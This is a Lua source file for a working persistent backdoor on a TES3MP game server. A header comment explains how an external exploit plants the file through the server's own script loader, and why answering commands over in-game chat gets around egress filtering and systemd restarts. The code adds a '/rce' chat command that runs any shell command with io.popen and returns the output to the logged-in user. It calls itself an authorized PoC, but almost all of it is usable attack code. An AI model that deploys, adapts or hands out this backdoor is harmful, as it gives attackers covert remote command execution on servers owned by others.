-- rce.lua - persistent command backdoor loaded by the TES3MP server's own script loader.
--
-- Delivery: the memory-corruption chain gives code execution as the service user (see the C++ exploit),
-- which writes this file into scripts/custom/ and appends `require("custom/rce")` to customScripts.lua.
-- serverCore.lua unconditionally require()s customScripts, so the NEXT server start (systemd restarts the
-- crashed process ~5s later) loads this module in a fresh, healthy process that owns the game socket.
--
-- Why in-band over the game protocol instead of a reverse shell or a socket-reuse stager:
--   * The target DMZ egress-filters: no new outbound connection can leave the box, so a reverse shell dies.
--   * A detached helper spawned from the *crashing* server is SIGKILLed with the unit's cgroup on restart
--     (systemd KillMode=control-group), so port-squatting the game socket does not survive.
--   * Running inside the healthy restarted server, we reuse the server's OWN message API: a chat command in,
--     command output back as server messages out. That rides RakNet (the one flow that reaches the client),
--     needs no second socket, and does not race the server's recv loop.
--
-- Trigger: `/rce <shell command>` in chat. Chat commands are gated on IsLoggedIn (eventHandler.lua), so the
-- operator connects and logs in a throwaway account first (registration is open on a default CoreScripts
-- server). Output is streamed back as server messages, chunked under the message length cap.
--
-- Authorized security research / PoC. Non-destructive by intent; remove scripts/custom/rce.lua and the
-- customScripts require line to uninstall.

tes3mp.LogMessage(enumerations.log.WARN, "[rce] backdoor module loaded")

local CHUNK = 900

local function reply(pid, text)
    if text == nil or text == "" then
        tes3mp.SendMessage(pid, "[rce] (no output)\n", false)
        return
    end
    for i = 1, #text, CHUNK do
        tes3mp.SendMessage(pid, text:sub(i, i + CHUNK - 1), false)
    end
end

customCommandHooks.registerCommand("rce", function(pid, cmd)
    -- cmd is the split chat message: cmd[1] == "rce", the rest is the shell command.
    local parts = {}
    for i = 2, #cmd do parts[#parts + 1] = cmd[i] end
    local shell = table.concat(parts, " ")
    if shell == "" then
        reply(pid, "usage: /rce <shell command>\n")
        return
    end
    tes3mp.LogMessage(enumerations.log.WARN, "[rce] exec by pid " .. tostring(pid) .. ": " .. shell)
    local ok, f = pcall(io.popen, shell .. " 2>&1")
    if not ok or f == nil then
        reply(pid, "[rce] io.popen failed\n")
        return
    end
    local out = f:read("*a")
    f:close()
    reply(pid, out)
end)
